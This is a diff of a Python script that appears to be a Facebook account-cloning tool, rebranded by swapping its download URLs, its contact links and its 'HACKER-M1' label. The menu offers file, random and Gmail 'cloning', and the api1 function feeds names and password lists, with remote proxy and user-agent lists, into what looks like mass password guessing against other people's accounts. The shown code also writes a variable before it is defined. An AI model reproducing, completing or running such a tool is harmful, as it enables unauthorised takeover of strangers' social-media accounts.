@@ -17,24 +17,24 @@ print('[•] Join Whatsap Group')
 os.system('xdg-open https://chat.whatsapp.com/B8pdA0ugVP')
 
 try:
-	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
-	open('proxies.txt','w').write(proxies)
+	prox= requests.get('https://github.com/NOOR-AFRIDI/Doctor1/blob/main/Approval.txt').text
+	open('approval.txt','w').write(proxies)
 except Exception as e:
 	print('\x1b[1;95m[√] LOADING...')
 	
-proxies=open('proxies.txt','r').read().splitlines()
+proxies=open('approval.txt','r').read().splitlines()
 
 
 android_models=[]
 try:
-	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
+	xx = requests.get('https://github.com/NOOR-AFRIDI/Doctor1/blob/main/Approval.txt').text.splitlines()
 	for line in xx:
 		android_models.append(line)
 except:pass
 
 usr=[]
 try:
-	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
+	xd=requests.get('https://github.com/NOOR-AFRIDI/Doctor1/blob/main/Approval.txt').text.splitlines()
 	for us in xd:
 		usr.append(us)
 except: pass
@@ -211,7 +211,7 @@ def menu():
 			print(' [1] File cloning\n [2] Random cloning\n [3] gmail cloning \n [4] join whatsap group \n [0] Exit menu')
 			linex()
 			xd=input(' Choose an option: ')
-		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
+		#	os.system('xdg-open https://www.facebook.com/DR.NOOR.AFRIDI')
 			if xd in ['1','01']:
 				clear()
 				print(' Put file example:  /sdcard/File.txt  etc..')
@@ -446,7 +446,7 @@ def gmail():
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [DLCT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [HACKER-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			fn = names.split(' ')[0]
 			try:
 				ln = names.split(' ')[1]
